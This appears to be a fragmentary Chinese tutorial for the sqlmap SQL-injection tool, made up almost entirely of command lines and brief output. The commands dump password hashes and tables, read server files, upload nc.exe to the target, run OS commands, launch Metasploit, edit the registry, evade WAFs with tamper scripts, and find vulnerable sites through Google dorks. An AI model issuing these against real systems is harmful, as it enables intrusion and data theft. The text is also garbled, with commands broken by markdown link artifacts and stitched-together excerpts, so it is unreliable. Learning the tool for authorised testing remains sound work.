...
python [sqlmap.py](http://sqlmap.py/) --update
...
例如：python [sqlmap.py](http://sqlmap.py/) -u "http://www.target.com/vuln.php?id=1" -f --banner --dbs --users
...
Host: [www.target.com](http://www.target.com/)
...
python [sqlmap.py](http://sqlmap.py/) -g "inurl:\".php?id=1\""
...
python [sqlmap.py](http://sqlmap.py/) -u "http://www.target.com/vuln.php" --data="id=1" -f --banner --dbs --users
...
python [sqlmap.py](http://sqlmap.py/) -u "http://www.target.com/vuln.php" --data="query=foobar;id=1" --param-del=";" -f --banner --dbs --users
...
sqlmap/1.0-dev-xxxxxxx ([http://sqlmap.org](http://sqlmap.org/))
...
python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"
...
使用--proxy代理是格式为：[http://url](http://url/):port。
...
python [sqlmap.py](http://sqlmap.py/) -l burp.log --scope="(www)?\.target\.(com|net|org)"
...
python [sqlmap.py](http://sqlmap.py/) -u "http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
...
python [sqlmap.py](http://sqlmap.py/) -u "http://targeturl/param1/value1*/param2/value2/"
...
python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "’)" --suffix "AND (’abc’=’abc"
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --passwords -v 1
[...]
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1" --columns -D testdb -T users -C name
[...]
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.48.130/sqlmap/mysql/get_int.php?id=1" --schema --batch --exclude-sysdbs
[...]
Database: owasp10
Table: accounts
[4 columns]
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --count -D testdb
[...]
Database: testdb
+----------------+---------+
| Table     | Entries |
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1" --dump -T users
[...]
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 1
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo', 'bar'" -v 2
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther" \
--file-read "C:/example.exe" -v 1

[...]
[hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2000
web application technology: [ASP.NET](http://asp.net/), Microsoft IIS 6.0, ASP
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write \
"/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1

[...]
[hh:mm:29] [INFO] the back-end DBMS is MySQL
web server operating system: Windows 2003 or 2008
web application technology: [ASP.NET](http://asp.net/), Microsoft IIS 6.0, [ASP.NET](http://asp.net/) 2.0.50727
back-end DBMS: MySQL >= 5.0.0
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \
--os-cmd id -v 1
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1" --os-pwn --msf-path /software/metasploit

[...]
[hh:mm:31] [INFO] the back-end DBMS is MySQL
web server operating system: Windows 2003
web application technology: [ASP.NET](http://asp.net/), [ASP.NET](http://asp.net/) 4.0.30319, Microsoft IIS 6.0
...
$ python [sqlmap.py](http://sqlmap.py/) -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.21.128/sqlmap/mysql/" --batch --crawl=3
[...]
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1" -b --eta
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1" --banner --hex -v 3 --parse-errors
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --parse-errors
[...]
...
python [sqlmap.py](http://sqlmap.py/) --batch --random-agent --ignore-proxy --technique=BEU -u "[www.target.com/vuln.php?id=1](http://www.target.com/vuln.php?id=1)"

可以写成：

python [sqlmap.py](http://sqlmap.py/) -z "bat,randoma,ign,tec=BEU" -u "[www.target.com/vuln.php?id=1](http://www.target.com/vuln.php?id=1)"

还有：

python [sqlmap.py](http://sqlmap.py/) --ignore-proxy --flush-session --technique=U --dump -D testdb -T users -u "[www.target.com/vuln.php?id=1](http://www.target.com/vuln.php?id=1)"

可以写成：

python [sqlmap.py](http://sqlmap.py/) -z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u "[www.target.com/vuln.php?id=1](http://www.target.com/vuln.php?id=1)"
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.22.128/sqlmap/mysql/get_int.php?id=1"--technique=E --answers="extending=N" --batch
[...]
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --identify-waf -v 3
[...]
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://www.target.com/vuln.php?id=1" --mobile
[...]
...
$ python [sqlmap.py](http://sqlmap.py/) --purge-output -v 3
[...]
...
$ python [sqlmap.py](http://sqlmap.py/) -u "http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&user=foo&id=1" --batch --smart
[...]
...
$ python [sqlmap.py](http://sqlmap.py/) --wizard
